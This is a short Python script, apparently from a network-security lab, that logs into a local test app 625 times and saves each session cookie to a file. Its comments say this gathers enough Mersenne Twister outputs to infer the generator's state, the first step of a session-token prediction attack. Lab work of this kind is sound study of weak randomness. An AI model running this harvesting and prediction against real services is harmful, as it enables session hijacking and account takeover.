import requests

# Open a file we will dump cookies to
with open("mersenneCookies.txt","w") as output:

    # For state inference attack we need 625 consecutive values
    # Mersenne twister has 624 numbers as its state. After 624 values it transforms the values to get a new state
    # If our query causes a transform, we will need 1 more number, bringing the total data to 625
    #
    for i in range(625):

        # Login as user
        #
        r = requests.post('http://0.0.0.0:5000/login', data = {'user':'user1', 'password':'password1'})

        # Write a login cookie to file
        #
        output.write(str(r.cookies['netsecLoginCookie']) + "\n")

        # Logout because we are nice :)
        #
        requests.post('http://0.0.0.0:5000/logout',cookies=r.cookies)
